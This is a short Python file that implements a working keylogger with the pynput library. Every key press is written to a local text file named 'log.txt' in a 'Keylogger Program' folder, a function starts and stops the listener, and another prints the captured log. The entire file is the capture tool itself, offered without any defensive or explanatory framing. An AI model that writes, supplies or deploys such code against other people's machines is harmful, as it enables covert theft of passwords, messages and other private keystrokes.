from pynput.keyboard import Listener

listener = None

def function1(keys):
    keydata=str(keys)
    keydata=keydata.replace("'","")
    if keydata=='Key.shift':
        keydata=''
    if keydata=='Key.space':
        keydata=' '
    if keydata=='Key.enter':
        keydata='~enterBtn~'
    if keydata=='Key.backspace':
        keydata=''

    with open(r"Keylogger Program\log.txt",'a') as f:
        f.write(keydata)

def function2(values):
    global listener
    if values == 1:
        listener = Listener(on_press=function1)
        listener.start()
    elif values == 0 and listener:
        listener.stop()
        listener = None

def function3():
    with open(r"Keylogger Program\log.txt",'r') as g:
        print(g.read())
